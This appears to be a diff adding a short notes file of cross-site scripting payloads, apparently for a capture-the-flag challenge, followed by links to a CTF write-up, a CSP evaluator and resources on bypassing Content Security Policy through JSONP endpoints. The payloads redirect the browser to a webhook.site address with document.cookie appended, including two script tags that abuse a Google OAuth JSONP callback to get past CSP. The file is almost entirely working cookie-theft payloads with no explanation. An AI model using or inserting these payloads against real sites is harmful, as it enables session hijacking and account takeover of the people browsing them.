@@ -1,0 +1,11 @@
+location.replace("http://webhook.site/7d31d426-230e-4e61-af7d-e9d5f1865873/?c="+document.cookie);
+document.location="http://webhook.site/7d31d426-230e-4e61-af7d-e9d5f1865873/?c="+document.cookie;
+
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=document.location%3D%22http%3A%2F%2Fwebhook.site%2F7d31d426-230e-4e61-af7d-e9d5f1865873%3Fc%3D%22%2Bdocument.cookie%3B"></script>
+
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=location.replace%28%22http%3A%2F%2Fwebhook.site%2F7d31d426-230e-4e61-af7d-e9d5f1865873%2F%3Fc%3D%22%2Bdocument.cookie%29%3B"></script>
+
+https://github.com/aicioara/ctf/tree/master/2018/2018-05-20-RCTF/web/rBlog2018
+https://csp-evaluator.withgoogle.com/
+https://medium.com/@mazin.ahmed/bypassing-csp-by-abusing-jsonp-endpoints-47cf453624d5
+https://github.com/zigoo0/JSONBee
